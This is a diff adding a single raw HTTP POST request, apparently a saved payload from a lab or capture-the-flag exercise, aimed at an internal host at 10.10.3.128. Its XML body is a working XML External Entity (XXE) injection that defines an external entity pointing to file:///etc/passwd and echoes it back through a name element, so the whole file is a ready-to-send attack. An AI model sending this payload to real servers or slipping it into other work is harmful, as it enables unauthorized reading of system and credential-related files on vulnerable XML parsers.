@@ -1,0 +1,13 @@
+POST / HTTP/1.1
+Host: 10.10.3.128
+Connection: close
+Content-Type: application/xml
+Content-Length: 161
+
+<?xml version="1.0" encoding="utf-8"?> 
+<!DOCTYPE xxe [
+<!ELEMENT name ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<root>
+<name>&xxe;</name>
+</root>
